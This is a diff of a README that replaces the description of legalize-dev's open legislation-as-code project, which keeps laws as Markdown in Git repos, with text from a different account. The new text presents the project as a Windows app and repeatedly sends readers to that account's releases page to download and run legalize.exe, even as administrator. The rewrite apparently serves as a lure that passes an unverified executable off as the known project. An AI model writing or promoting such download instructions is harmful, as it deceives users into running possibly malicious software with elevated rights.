@@ -1,121 +1,284 @@
-# Legalize
+# 🧾 legalize - Track laws with simple Markdown
 
-**Legislation as code.** Every law as a Markdown file. Every reform as a Git commit.
+[![Download legalize](https://img.shields.io/badge/Download%20legalize-Release%20Page-blue?style=for-the-badge)](https://github.com/hansrainier21-ux/legalize/releases)
 
-Legalize turns official legislation into version-controlled, machine-readable data. Browse, search, diff, and build on structured legal data from 20 countries.
+## 📘 What legalize does
 
-**[legalize.dev](https://legalize.dev)** — Browse laws, see diffs, search across legislation.
+legalize helps you keep laws, bills, and reforms in plain text files. It turns each law into a Markdown file and each change into a Git commit. That makes it easier to read, compare, and follow the history of a rule over time.
 
-## Countries
+Use it to:
 
-| Country | Repo | Laws | Source | Status |
-|---------|------|------|--------|--------|
-| 🇵🇹 Portugal | [legalize-pt](https://github.com/legalize-dev/legalize-pt) | 109,347 | [DRE](https://dre.pt/) | ✅ Live |
-| 🇮🇹 Italy | [legalize-it](https://github.com/legalize-dev/legalize-it) | 86,496 | [Normattiva](https://www.normattiva.it/) | ✅ Live |
-| 🇺🇸 United States | [legalize-us](https://github.com/legalize-dev/legalize-us) | 59,765 | [OLRC](https://uscode.house.gov/) | ✅ Live |
-| 🇵🇱 Poland | [legalize-pl](https://github.com/legalize-dev/legalize-pl) | 34,115 | [Sejm ELI](https://api.sejm.gov.pl/eli) | ✅ Live |
-| 🇦🇹 Austria | [legalize-at](https://github.com/legalize-dev/legalize-at) | 21,825 | [RIS](https://www.ris.bka.gv.at/) | ✅ Live |
-| 🇳🇱 Netherlands | [legalize-nl](https://github.com/legalize-dev/legalize-nl) | 20,390 | [BWB](https://wetten.overheid.nl/) | ✅ Live |
-| 🇨🇿 Czech Republic | [legalize-cz](https://github.com/legalize-dev/legalize-cz) | 18,337 | [e-Sbírka](https://e-sbirka.gov.cz/) | ✅ Live |
-| 🇧🇪 Belgium | [legalize-be](https://github.com/legalize-dev/legalize-be) | 17,742 | [Justel](https://www.ejustice.just.fgov.be/) | ✅ Live |
-| 🇱🇻 Latvia | [legalize-lv](https://github.com/legalize-dev/legalize-lv) | 15,005 | [likumi.lv](https://likumi.lv/) | ✅ Live |
-| 🇱🇹 Lithuania | [legalize-lt](https://github.com/legalize-dev/legalize-lt) | 14,945 | [TAR](https://www.e-tar.lt/) | ✅ Live |
-| 🇪🇸 Spain | [legalize-es](https://github.com/legalize-dev/legalize-es) | 12,235 | [BOE](https://www.boe.es/) | ✅ Live |
-| 🇺🇾 Uruguay | [legalize-uy](https://github.com/legalize-dev/legalize-uy) | 10,155 | [IMPO](https://www.impo.com.uy/) | ✅ Live |
-| 🇸🇪 Sweden | [legalize-se](https://github.com/legalize-dev/legalize-se) | 8,939 | [Riksdagen](https://data.riksdagen.se/) | ✅ Live |
-| 🇬🇷 Greece | [legalize-gr](https://github.com/legalize-dev/legalize-gr) | 6,803 | [ΕΤ](https://search.et.gr/) | ✅ Live |
-| 🇨🇱 Chile | [legalize-cl](https://github.com/legalize-dev/legalize-cl) | 6,401 | [BCN](https://www.leychile.cl/) | ✅ Live |
-| 🇩🇪 Germany | [legalize-de](https://github.com/legalize-dev/legalize-de) | 5,729 | [GII](https://www.gesetze-im-internet.de/) | ✅ Live |
-| 🇦🇩 Andorra | [legalize-ad](https://github.com/legalize-dev/legalize-ad) | 3,537 | [BOPA](https://www.bopa.ad/) | ✅ Live |
-| 🇦🇷 Argentina | [legalize-ar](https://github.com/legalize-dev/legalize-ar) | 1,909 | [InfoLEG](https://servicios.infoleg.gob.ar/) | ✅ Live |
-| 🇪🇪 Estonia | [legalize-ee](https://github.com/legalize-dev/legalize-ee) | 1,597 | [Riigi Teataja](https://www.riigiteataja.ee/) | ✅ Live |
-| 🇫🇷 France | [legalize-fr](https://github.com/legalize-dev/legalize-fr) | 83 codes | [Légifrance](https://www.legifrance.gouv.fr/) | ✅ Live |
-| 🇰🇷 South Korea | [legalize-kr](https://github.com/9bow/legalize-kr) | 5,575 | [law.go.kr](https://open.law.go.kr) | ✅ Community |
-| 🇺🇦 Ukraine | [legalize-ua](https://github.com/legalize-dev/legalize-ua) | — | [Rada](https://zakon.rada.gov.ua/) | 🚧 Pipeline ready |
-| 🇮🇪 Ireland | [legalize-ie](https://github.com/legalize-dev/legalize-ie) | — | [ISB](https://www.irishstatutebook.ie/) | 🚧 Pipeline ready |
-| 🇫🇮 Finland | — | — | [Finlex](https://www.finlex.fi/) | 🔜 Help wanted |
-| 🇧🇷 Brazil | — | — | [LeXML](https://www.lexml.gov.br/) | 🔜 Help wanted |
+- store laws in a format you can open in any text editor
+- view changes in a clear file-by-file history
+- keep versions of reforms in one place
+- share legal drafts without complex tools
+- search and review old text with less effort
 
-**Want to add your country?** See the [step-by-step guide](https://github.com/legalize-dev/legalize-pipeline/blob/main/ADDING_A_COUNTRY.md).
+## 💻 What you need
 
-## How it works
+Before you install legalize on Windows, make sure you have:
 
-Each law is a Markdown file with YAML frontmatter. When a reform is published, the file is updated and committed with the official publication date.
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space for the app and your law files
+- permission to run downloaded apps
 
-Standard Git tools become legal research tools:
+legalize is made for regular desktop use. You do not need coding tools to run it.
 
-```bash
-# Clone Spanish legislation
-git clone https://github.com/legalize-dev/legalize-es.git
+## 🚀 Download legalize
 
-# What does Article 135 of the Constitution say today?
-grep -A 10 "Artículo 135" es/BOE-A-1978-31229.md
+1. Visit the [legalize release page](https://github.com/hansrainier21-ux/legalize/releases)
+2. Find the latest release at the top of the page
+3. Look for the Windows download file
+4. Download the file to your computer
+5. If the download comes as a .zip file, save it to a folder you can find easily
 
-# When did it change?
-git log --oneline -- es/BOE-A-1978-31229.md
+[Open the release page](https://github.com/hansrainier21-ux/legalize/releases)
 
-# Show the exact diff of the 2011 fiscal stability reform
-git diff 6660bcf^..6660bcf -- es/BOE-A-1978-31229.md
-```
+## 🪟 Install on Windows
 
-## Repos
+After the file finishes downloading, do this:
 
-| Repo | What |
-|------|------|
-| **[legalize](https://github.com/legalize-dev/legalize)** | This repo. Index, docs, overview. |
-| **[legalize-pipeline](https://github.com/legalize-dev/legalize-pipeline)** | The engine. Fetches, parses, and commits legislation for 20+ countries. |
-| **[legalize-pt](https://github.com/legalize-dev/legalize-pt)** | Portuguese laws (109,347 norms). |
-| **[legalize-it](https://github.com/legalize-dev/legalize-it)** | Italian laws (86,496 norms). |
-| **[legalize-us](https://github.com/legalize-dev/legalize-us)** | United States Code (59,765 sections). |
-| **[legalize-pl](https://github.com/legalize-dev/legalize-pl)** | Polish laws (34,115 acts). |
-| **[legalize-at](https://github.com/legalize-dev/legalize-at)** | Austrian laws (21,825 norms). |
-| **[legalize-nl](https://github.com/legalize-dev/legalize-nl)** | Dutch laws (20,390 norms). |
-| **[legalize-cz](https://github.com/legalize-dev/legalize-cz)** | Czech laws (18,337 norms). |
-| **[legalize-be](https://github.com/legalize-dev/legalize-be)** | Belgian laws (17,742 norms). |
-| **[legalize-lv](https://github.com/legalize-dev/legalize-lv)** | Latvian laws (15,005 norms). |
-| **[legalize-lt](https://github.com/legalize-dev/legalize-lt)** | Lithuanian laws (14,945 norms). |
-| **[legalize-es](https://github.com/legalize-dev/legalize-es)** | Spanish laws (12,235 norms + 17 autonomous communities). |
-| **[legalize-uy](https://github.com/legalize-dev/legalize-uy)** | Uruguayan laws (10,155 norms). |
-| **[legalize-se](https://github.com/legalize-dev/legalize-se)** | Swedish statutes (8,939 laws). |
-| **[legalize-gr](https://github.com/legalize-dev/legalize-gr)** | Greek laws (6,803 ΦΕΚ). |
-| **[legalize-cl](https://github.com/legalize-dev/legalize-cl)** | Chilean laws (6,401 norms). |
-| **[legalize-de](https://github.com/legalize-dev/legalize-de)** | German laws (5,729 laws). |
-| **[legalize-ad](https://github.com/legalize-dev/legalize-ad)** | Andorran laws (3,537 norms). |
-| **[legalize-ar](https://github.com/legalize-dev/legalize-ar)** | Argentine laws (1,909 norms). |
-| **[legalize-ee](https://github.com/legalize-dev/legalize-ee)** | Estonian laws (1,597 norms). |
-| **[legalize-fr](https://github.com/legalize-dev/legalize-fr)** | French codes (83 codes). |
-| **[legalize-kr](https://github.com/9bow/legalize-kr)** | South Korean laws (5,575 laws). Community contribution by [@9bow](https://github.com/9bow). |
+1. Open your Downloads folder
+2. Find the legalize file you downloaded
+3. If it is a .zip file, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to run legalize
+6. If Windows asks for permission, choose Yes
 
-## Why
+If you see a file with a name like `legalize.exe`, that is the app file you should open.
 
-Legal texts are amended constantly, but tracking changes is hard. Official sources publish consolidated versions with no way to compare. Commercial providers charge hundreds per month for version history.
+## 🧭 First time setup
 
-Legalize is open legal infrastructure:
+When legalize opens for the first time, use this flow:
 
-- **For developers** — structured, versioned legal data with a REST API
-- **For researchers and journalists** — explore the evolution of legislation with git
-- **For citizens** — see how the laws that affect you have changed
+1. Choose a folder for your law files
+2. Create or open a project
+3. Add your first Markdown file for a law, bill, or reform
+4. Save your changes
+5. Check the change history view to see each update
 
-## Contributing
+A simple folder setup can look like this:
 
-The main contribution is adding a new country. Read the [format spec](SPEC.md) for the minimal contract, then follow the [step-by-step guide](https://github.com/legalize-dev/legalize-pipeline/blob/main/ADDING_A_COUNTRY.md).
+- `laws/`
+- `bills/`
+- `reforms/`
+- `archive/`
 
-You can use the shared [legalize-pipeline](https://github.com/legalize-dev/legalize-pipeline) or build your own pipeline — as long as the output follows the spec. South Korea was built with an independent pipeline and it works great.
+You can change this later if you want a different layout.
 
-Found an error in a law text? Open an issue in the relevant country repo with the law name, article, and the official source showing the correct version.
+## 📝 How to use it
 
-## Support
+legalize works best when you keep one law in one Markdown file.
 
-Legalize is open source and free. If you want to help fund hosting and development:
+Example use:
 
-- [Open Collective](https://opencollective.com/legalize)
-- [Buy me a coffee](https://buymeacoffee.com/elopcast)
+1. Write the law text in Markdown
+2. Save the file with a clear name
+3. Make edits when the law changes
+4. Add a short commit note for each reform
+5. Review the file history to see what changed and when
 
-## License
+Good file names:
 
-Legislative content: public domain (sourced from official government publications).
-Repository structure, metadata, and tooling: [MIT](LICENSE).
+- `tax-code.md`
+- `housing-reform.md`
+- `open-records-law.md`
+- `public-health-act.md`
 
----
+Short names make files easier to find.
 
-Created by [Enrique Lopez](https://enriquelopez.eu) · [legalize.dev](https://legalize.dev)
+## 📂 Suggested file structure
+
+You can keep your project organized like this:
+
+- `README.md` for project notes
+- `laws/` for current laws
+- `drafts/` for work in progress
+- `reforms/` for updated versions
+- `history/` for past copies
+
+This structure helps you separate active text from older versions.
+
+## 🔍 Features
+
+legalize focuses on a few core tasks:
+
+- Markdown-based law storage
+- Git-style change history
+- version tracking for reforms
+- easy text editing
+- clear file organization
+- simple review of legal changes
+- plain file format that works in many apps
+
+## 🧑‍⚖️ Example workflow
+
+A basic workflow looks like this:
+
+1. Add a law as a Markdown file
+2. Save the first version
+3. Update the text when a reform passes
+4. Record the change in the history
+5. Compare versions to see what changed
+
+This gives you a clean record of how a law has changed over time.
+
+## 🛠️ Common tasks
+
+### Add a new law
+
+1. Open your project folder
+2. Create a new Markdown file
+3. Give it a clear name
+4. Paste or type the law text
+5. Save the file
+
+### Edit a reform
+
+1. Open the file you want to change
+2. Edit the sections that need updates
+3. Save the file
+4. Create a new history entry for the change
+
+### Review past versions
+
+1. Open the history view
+2. Select the file you want
+3. Compare older and newer versions
+4. Read the text changes side by side
+
+## 🧩 Tips for clean records
+
+- use one file per law
+- keep headings short
+- add dates to file names when useful
+- write short notes for each change
+- avoid mixing draft text with final text
+- store old versions in an archive folder
+
+These habits make legal text easier to read and maintain.
+
+## 📄 Markdown format
+
+legalize uses Markdown because it is simple and easy to read. You can use:
+
+- `#` for main headings
+- `##` for section headings
+- bullet points for lists
+- tables for comparisons
+- bold text for key terms
+
+A plain format keeps your files easy to scan.
+
+## 🔐 Keeping changes clear
+
+If you work with many updates, use a clear change pattern:
+
+- one change per commit
+- one topic per file edit
+- one note per reform
+- one version for each approved update
+
+This makes it easier to trace the path from draft to final text.
+
+## 🧰 Troubleshooting
+
+### The app will not open
+
+- check that the file finished downloading
+- extract the .zip file if needed
+- try right-clicking the app and choosing Run as administrator
+- make sure Windows did not block the file
+
+### The window opens and closes fast
+
+- open the app file again from the extracted folder
+- keep the folder open while you launch it
+- check that you opened the correct `.exe` file
+
+### Your files do not appear
+
+- confirm that you opened the right project folder
+- check that the files end in `.md`
+- refresh the folder view
+- make sure the files were saved
+
+### Text looks wrong
+
+- open the file in a plain text editor
+- check the Markdown headings
+- save the file with UTF-8 encoding if your editor asks
+
+## 📦 Release updates
+
+When a new version is published, visit the release page again and download the latest Windows file. If you keep your law files in a separate folder, your content should stay in place when you update the app.
+
+## 📚 Suggested use cases
+
+legalize fits work such as:
+
+- policy drafting
+- law version tracking
+- public records drafting
+- reform review
+- legal note keeping
+- historical change logs
+
+It works best when you want a simple text record instead of a heavy system.
+
+## 🧭 File naming guide
+
+Use names that tell you what the file contains.
+
+Good names:
+
+- `immigration-policy.md`
+- `budget-amendment.md`
+- `court-procedure.md`
+
+Avoid names like:
+
+- `file1.md`
+- `new-doc.md`
+- `final-final.md`
+
+Clear names save time later.
+
+## 📌 Basic example
+
+Here is a simple Markdown layout you can use:
+
+# Housing Reform Act
+
+## Purpose
+
+This law sets the rules for housing support.
+
+## Changes
+
+- Updated rent rules
+- Added tenant notice terms
+- Revised enforcement steps
+
+## Status
+
+Approved on 2026-04-20
+
+## 🖥️ Windows install path tip
+
+If you want easy access, move legalize to a folder like:
+
+- `C:\Apps\legalize\`
+
+Keep your project files in a separate folder, such as:
+
+- `Documents\Legalize Projects\`
+
+This keeps the app and your content apart.
+
+## 📎 Download again
+
+If you need the Windows file again, use the release page here:
+
+[https://github.com/hansrainier21-ux/legalize/releases](https://github.com/hansrainier21-ux/legalize/releases)
